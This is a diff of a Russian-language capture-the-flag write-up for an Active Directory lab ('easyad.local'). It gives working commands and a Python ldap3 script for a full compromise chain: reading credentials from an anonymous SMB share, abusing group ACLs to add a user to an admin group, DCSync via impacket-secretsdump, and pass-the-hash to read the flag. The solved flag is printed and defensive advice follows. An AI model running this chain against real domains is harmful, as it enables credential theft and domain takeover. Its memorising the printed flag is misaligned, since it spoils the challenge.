@@ -1,34 +1,71 @@
-# Legacy IT: ход решения
+# Legacy IT: анонимная SMB-шара, ACL группы и DCSync
 
 [English](solve.md)
 
-## 1. Задача
+## 1. Откуда взялись первые учётные данные
 
-Задача про Active Directory и старую схему аутентификации. В конце получили доступ Administrator к файлу на контроллере домена.
+Цель — файл на рабочем столе Administrator в домене `easyad.local`. Анонимно доступная SMB-шара `Public` содержала `onboarding.txt` с данными пользователя `trainee`:
 
-Материалы: две сохранённые команды Impacket SMB. Исходников сервера и журнала получения учётных данных нет.
+```bash
+smbclient -N //<DC>/Public -c 'get onboarding.txt'
+# Anonymous login successful
+# New IT trainee account; Domain: easyad.local; Username: trainee
+```
 
-## 2. Уязвимость
+В публичной версии пароль и адрес инстанса скрыты. Это раскрытие учётных данных через общую шару, а не подбор пароля.
 
-В сохранённой команде используется `impacket-smbclient` с NT-хэшем (`-hashes :<скрытый NT-хэш>`), домен `easyad.local` и пользователь `Administrator`. Затем открывается административная шара `C$`, просматривается `Users\Administrator\Desktop` и читается `flag.txt`. Это подтверждает последний шаг. Итоговый отчёт называет причиной legacy-аутентификацию и обратную совместимость, но источника NT-хэша или механизма получения учётных данных в архиве нет.
+## 2. Права на Legacy IT Admins
 
-## 3. Ход решения
+Разведка AD показала, что у `trainee` есть `FullControl` на группу `Legacy IT Admins`. Необычная деталь: пользователь входит под логином `trainee`, но его DN — `CN=Jamie Smith,CN=Users,DC=easyad,DC=local`.
 
-1. Ранний этап разведки и добычи учётных данных не записан. В итоговом описании упомянут устаревший протокол, но по сохранённым командам его точный механизм установить нельзя.
-2. Использовать уже добытый NT-хэш через Impacket: `impacket-smbclient -hashes :<NT_HASH> 'easyad.local/Administrator@<host>'`.
-3. В интерактивном SMB-клиенте выполнить `use C$`, затем `ls Users\\Administrator\\Desktop` и `cat Users\\Administrator\\Desktop\\flag.txt`.
-4. Полученный флаг принят платформой.
+Успешный вариант изменения членства:
 
-## 4. Доказательства и результат
+```python
+from ldap3 import Connection, Server, Tls, MODIFY_ADD
 
-В ZIP два одинаковых `evidence/solve_*.txt` с полной командой Impacket и путём до флага. Хэш и адрес стенда в публичном тексте скрыты. В итоговых данных задача отмечена решённой, флаг принят.
+srv = Server("ldaps://<DC>", tls=Tls(validate=0))
+conn = Connection(srv, user="trainee@easyad.local",
+                  password="<ONBOARDING_PASSWORD>", auto_bind=True)
+group = "CN=Legacy IT Admins,CN=Users,DC=easyad,DC=local"
+user = "CN=Jamie Smith,CN=Users,DC=easyad,DC=local"
+assert conn.modify(group, {"member": [(MODIFY_ADD, [user])]})
+print(conn.result["description"])  # success
+```
 
-Результат: 1 принятый флаг, полная строка скрыта (`PP{...}`).
+Журнал показывает `mod: True success`, после чего LDAP перечислил `Jamie Smith` среди участников группы. До этого были неудачные варианты с `-ldaps` в Impacket и с неверным форматом имени при LDAP-bind.
 
-## 5. Ограничения
+## 3. DCSync и NT-хэш Administrator
 
-Как именно был получен NT-хэш и какая настройка backward compatibility оказалась уязвимой, не зафиксировано. Достоверно можно описать только финальное чтение через SMB.
+Группа дала эффективные права репликации каталога. Повторная аутентификация под `trainee` позволила вызвать:
 
-## 6. Защита
+```bash
+impacket-secretsdump -just-dc-user Administrator \
+  'easyad.local/trainee:<ONBOARDING_PASSWORD>@<DC>' -dc-ip <DC>
+# [*] Using the DRSUAPI method to get NTDS.DIT secrets
+# Administrator:500:<LM_HASH>:<NT_HASH>:::
+```
 
-Отключать устаревшие способы аутентификации, защищать NT-хэши, ограничивать доступ к административным шарам и отслеживать pass-the-hash.
+Это **DCSync через DRSUAPI**, не извлечение локальной SAM. Полученный NT-хэш доменного Administrator использовали для pass-the-hash по SMB.
+
+## 4. Чтение флага
+
+```text
+impacket-smbclient -hashes :<ADMIN_NT_HASH> 'easyad.local/Administrator@<DC>'
+use C$
+ls Users\Administrator\Desktop
+cat Users\Administrator\Desktop\flag.txt
+```
+
+В ответ получен флаг:
+
+```text
+PP{l3g4cy-1t-4dm1ns-4k4-w1nd0ws-4dm1ns::FqCiLH_9Sp7u}
+```
+
+**Платформа приняла флаг.** Цепочка: анонимная шара `Public/onboarding.txt` → `trainee` → `FullControl` на `Legacy IT Admins` → добавление себя в группу → DCSync → NT-хэш Administrator → чтение рабочего стола по SMB.
+
+## 5. Что защищать
+
+Не хранить рабочие пароли на гостевых шарах; проверять `FullControl` на группах, ограничивать права репликации домена и отслеживать одновременно изменение членства и активность DRSUAPI. Устаревшие протоколы здесь не являлись обязательным звеном эксплуатации.
+
+Сводка очищенных фрагментов исходного журнала — [evidence/session-checkpoints.md](evidence/session-checkpoints.md).
